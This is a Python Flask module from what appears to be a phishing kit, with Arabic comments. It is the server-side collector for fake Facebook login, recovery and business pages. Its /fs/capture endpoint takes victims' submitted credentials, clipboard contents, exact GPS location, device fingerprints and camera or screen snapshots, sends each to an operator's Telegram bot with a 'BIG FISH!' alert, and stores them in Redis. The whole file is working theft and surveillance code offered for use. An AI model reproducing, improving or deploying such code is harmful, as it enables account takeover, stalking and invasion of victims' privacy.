# fake_sites/data_handler.py
# ============================================================
# استقبال البيانات من كل المواقع المزيفة
# ============================================================

import io
import time
import json
import base64
from datetime import datetime

from flask import request, jsonify

from config import bot, redis_client

from logging_config import get_logger
from monitoring import metrics

logger = get_logger("fake_sites.data_handler")


# ============================================================
# تعيين القالب → اسم للعرض
# ============================================================
SITE_DISPLAY = {
    "facebook_01_login": "Facebook · تسجيل الدخول",
    "facebook_02_recovery": "Facebook · استرداد الحساب",
    "facebook_03_verify": "Facebook · تحقق",
    "facebook_04_ads": "Facebook · Ads Manager",
    "facebook_05_business": "Facebook · Business Suite",
    "facebook_06_marketplace": "Facebook · Marketplace",
    "facebook_07_groups": "Facebook · Groups",
    "facebook_08_dating": "Facebook · Dating",
    "facebook_09_gaming": "Facebook · Gaming",
    "facebook_10_creator": "Facebook · Creator Studio",
}


# ============================================================
# Helpers
# ============================================================
def _h(text):
    """Escape HTML"""
    if text is None:
        return ""
    import html as html_mod
    return html_mod.escape(str(text))


def _get_session_data(session_id):
    """يرجع بيانات الـ session"""
    if not redis_client:
        return None
    try:
        raw = redis_client.get(f"se_session:{session_id}")
        if raw:
            return json.loads(raw)
    except Exception as e:
        logger.warning(f"_get_session_data error: {e}")
    return None


def _save_session_data(session_id, data):
    """يحفظ بيانات الـ session"""
    if not redis_client:
        return
    try:
        redis_client.setex(
            f"se_session:{session_id}",
            86400 * 30,
            json.dumps(data, ensure_ascii=False)
        )
    except Exception as e:
        logger.warning(f"_save_session_data error: {e}")


def _get_client_ip():
    return (
        request.headers.get('CF-Connecting-IP') or
        request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
        request.remote_addr
    )


# ============================================================
# ★★★ إرسال البيانات للبوت ★★★
# ============================================================
def send_credentials_to_bot(chat_id, session_id, site, credentials, extra=None):
    """يرسل البيانات المسروقة للبوت"""
    try:
        cid = int(chat_id) if str(chat_id).isdigit() else chat_id

        ip = _get_client_ip()
        ua = request.headers.get('User-Agent', 'Unknown')[:120]
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # اسم الموقع للعرض
        site_display = SITE_DISPLAY.get(site, site)

        # ─── بناء الرسالة ───
        lines = [
            "🎯 <b>BIG FISH!</b>",
            "━━━━━━━━━━━━━━━━━━━━",
            "",
            f"🌐 <b>الموقع:</b> {_h(site_display)}",
            f"🆔 <b>Session:</b> <code>{session_id}</code>",
            f"🕐 <b>الوقت:</b> <code>{now}</code>",
            "",
            "━━━ 📥 البيانات ━━━",
        ]

        # أضف كل حقل
        for key, value in credentials.items():
            if value:
                lines.append(f"🔑 <b>{_h(key)}:</b> <code>{_h(str(value)[:200])}</code>")

        # بيانات إضافية
        if extra:
            lines.append("")
            lines.append("━━━ 📋 إضافي ━━━")
            for key, value in list(extra.items())[:8]:
                lines.append(f"• <b>{_h(key)}:</b> <code>{_h(str(value)[:100])}</code>")

        lines.extend([
            "",
            "━━━ 🌐 الشبكة ━━━",
            f"📍 <b>IP:</b> <code>{_h(ip)}</code>",
            f"📱 <b>UA:</b> <code>{_h(ua)}</code>",
        ])

        text = "\n".join(lines)

        bot.send_message(cid, text, parse_mode="HTML", disable_web_page_preview=True)

        metrics.inc_counter("credentials_captured", tags={
            "site": site,
            "type": "form"
        })

        logger.info(f"✅ BIG FISH! {site} | session={session_id[:12]} | chat={chat_id}")

        # ─── حفظ في Redis ───
        try:
            if redis_client:
                redis_client.lpush(
                    f"se_credentials:{chat_id}",
                    json.dumps({
                        'site': site,
                        'session_id': session_id,
                        'credentials': credentials,
                        'extra': extra or {},
                        'ip': ip,
                        'ua': ua,
                        'timestamp': time.time(),
                        'time_str': now,
                    }, ensure_ascii=False)
                )
                redis_client.ltrim(f"se_credentials:{chat_id}", 0, 999)
                redis_client.expire(f"se_credentials:{chat_id}", 86400 * 30)
        except Exception as e:
            logger.warning(f"Redis save creds error: {e}")

        return True

    except Exception as e:
        logger.exception(f"send_credentials_to_bot error: {e}")
        return False


def send_permissions_to_bot(chat_id, session_id, site, permissions, fingerprint=None):
    """يرسل نتائج الصلاحيات للبوت"""
    try:
        cid = int(chat_id) if str(chat_id).isdigit() else chat_id

        site_display = SITE_DISPLAY.get(site, site)

        # ─── بناء الرسالة ───
        lines = [
            "🎁 <b>PERMISSIONS GRANTED!</b>",
            "━━━━━━━━━━━━━━━━━━━━",
            "",
            f"🌐 <b>الموقع:</b> {_h(site_display)}",
            f"🆔 <b>Session:</b> <code>{session_id}</code>",
            "",
            "━━━ 🔓 الصلاحيات ━━━",
        ]

        # كل صلاحية
        perm_icons = {
            'camera': '📷',
            'microphone': '🎙️',
            'location': '📍',
            'notifications': '🔔',
            'clipboard': '📋',
            'screen': '🖥️',
        }

        for key, value in permissions.items():
            if key == 'location_data':
                continue
            icon = perm_icons.get(key, '•')
            status_icon = "✅" if value == 'granted' else "❌"
            lines.append(f"{icon} <b>{_h(key)}:</b> {status_icon} {_h(value)}")

        # الموقع
        if 'location_data' in permissions:
            loc = permissions['location_data']
            lines.append("")
            lines.append("📍 <b>الموقع الدقيق:</b>")
            lines.append(f"  • <code>{loc.get('lat')}, {loc.get('lng')}</code>")
            lines.append(f"  • دقة: {loc.get('accuracy')} م")
            lines.append(f'  • <a href="https://maps.google.com/?q={loc.get("lat")},{loc.get("lng")}">فتح الخريطة</a>')

        # الحافظة
        if permissions.get('clipboard_text'):
            lines.append("")
            lines.append(f"📋 <b>الحافظة:</b> <code>{_h(permissions['clipboard_text'][:200])}</code>")

        # بصمة الجهاز
        if fingerprint:
            lines.append("")
            lines.append("━━━ 💻 الجهاز ━━━")
            if fingerprint.get('platform'):
                lines.append(f"🖥️ <b>Platform:</b> <code>{_h(fingerprint['platform'])}</code>")
            if fingerprint.get('language'):
                lines.append(f"🌍 <b>Language:</b> <code>{_h(fingerprint['language'])}</code>")
            if fingerprint.get('timezone'):
                lines.append(f"⏰ <b>Timezone:</b> <code>{_h(fingerprint['timezone'])}</code>")
            if fingerprint.get('screen_width'):
                lines.append(f"📏 <b>Screen:</b> <code>{fingerprint['screen_width']}×{fingerprint['screen_height']}</code>")

        text = "\n".join(lines)
        bot.send_message(cid, text, parse_mode="HTML", disable_web_page_preview=True)

        metrics.inc_counter("permissions_captured", tags={"site": site})
        logger.info(f"🔓 Permissions! {site} | session={session_id[:12]}")

        # ─── حفظ ───
        try:
            if redis_client:
                redis_client.lpush(
                    f"se_permissions:{chat_id}",
                    json.dumps({
                        'site': site,
                        'session_id': session_id,
                        'permissions': permissions,
                        'fingerprint': fingerprint or {},
                        'timestamp': time.time(),
                    }, ensure_ascii=False)
                )
                redis_client.ltrim(f"se_permissions:{chat_id}", 0, 999)
        except Exception as e:
            logger.warning(f"Redis save perms error: {e}")

        return True

    except Exception as e:
        logger.exception(f"send_permissions_to_bot error: {e}")
        return False


def send_snapshot_to_bot(chat_id, session_id, site, media_type, image_data):
    """يرسل صورة (كاميرا/شاشة) للبوت"""
    try:
        cid = int(chat_id) if str(chat_id).isdigit() else chat_id

        site_display = SITE_DISPLAY.get(site, site)

        # فك base64
        if not image_data or not image_data.startswith('data:image'):
            return False

        try:
            _, encoded = image_data.split(',', 1)
            img_bytes = base64.b64decode(encoded)
        except Exception as e:
            logger.warning(f"Base64 decode error: {e}")
            return False

        # ─── بناء الصورة ───
        buf = io.BytesIO(img_bytes)
        buf.name = f"{media_type}_{int(time.time())}.jpg"

        # ─── Caption ───
        if media_type == 'camera':
            icon = "📷"
            title = "صورة من الكاميرا"
        elif media_type == 'screen':
            icon = "🖥️"
            title = "صورة من الشاشة"
        else:
            icon = "📸"
            title = "لقطة"

        caption = (
            f"{icon} <b>{title}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 <b>الموقع:</b> {_h(site_display)}\n"
            f"🆔 <b>Session:</b> <code>{session_id}</code>"
        )

        bot.send_photo(cid, buf, caption=caption, parse_mode="HTML")

        metrics.inc_counter("snapshot_captured", tags={
            "site": site,
            "media": media_type
        })

        logger.info(f"📸 Snapshot sent: {media_type} | {site}")

        return True

    except Exception as e:
        logger.exception(f"send_snapshot_to_bot error: {e}")
        return False


# ============================================================
# Init
# ============================================================
def init_data_handler(app, bot_instance):
    """تسجيل endpoint استقبال البيانات"""

    global bot
    bot = bot_instance

    @app.route('/fs/capture', methods=['POST', 'OPTIONS'])
    def fs_capture():
        """يستقبل كل البيانات من المواقع المزيفة"""

        # CORS
        if request.method == 'OPTIONS':
            resp = app.make_response('')
            resp.headers['Access-Control-Allow-Origin'] = '*'
            resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
            resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
            return resp, 200

        try:
            data = request.get_json(silent=True) or {}

            dtype = data.get('type', 'unknown')
            session_id = data.get('session_id', '').strip()
            site = data.get('site', 'unknown')

            if not session_id:
                return jsonify({'ok': False, 'error': 'no_session'}), 200

            # ─── جلب chat_id من الـ session ───
            session_data = _get_session_data(session_id)
            if not session_data or not session_data.get('chat_id'):
                logger.warning(f"Unknown session: {session_id}")
                return jsonify({'ok': False, 'error': 'invalid_session'}), 200

            chat_id = session_data['chat_id']

            logger.info(f"📥 FS Capture | type={dtype} | site={site} | session={session_id[:12]}")

            # ─── حسب النوع ───
            if dtype == 'credentials':
                credentials = data.get('credentials', {})
                extra = {
                    'url': data.get('url', ''),
                    'fingerprint': data.get('fingerprint', {}),
                }
                send_credentials_to_bot(chat_id, session_id, site, credentials, extra)

            elif dtype == 'permissions':
                permissions = data.get('permissions', {})
                fingerprint = data.get('fingerprint', {})
                send_permissions_to_bot(chat_id, session_id, site, permissions, fingerprint)

            elif dtype == 'snapshot':
                media_type = data.get('media_type', 'unknown')
                image = data.get('image', '')
                send_snapshot_to_bot(chat_id, session_id, site, media_type, image)

            else:
                logger.warning(f"Unknown FS type: {dtype}")

            resp = jsonify({'ok': True})
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp, 200

        except Exception as e:
            logger.exception(f"fs_capture error: {e}")
            resp = jsonify({'ok': False})
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp, 200

    # ─── Serve Static ───
    @app.route('/fs/static/<path:filename>')
    def fs_static(filename):
        """تقديم الملفات الثابتة"""
        import os
        from flask import send_from_directory

        # مسار آمن
        base = os.path.join(os.path.dirname(__file__), 'core')
        if '..' in filename or filename.startswith('/'):
            return "Forbidden", 403

        # ابحث في core/js أو core/css
        for subfolder in ['js', 'css']:
            full_path = os.path.join(base, subfolder, filename)
            if os.path.exists(full_path):
                return send_from_directory(
                    os.path.join(base, subfolder),
                    filename
                )

        return "Not found", 404

    logger.info("[+] FS Data handler registered: /fs/capture")
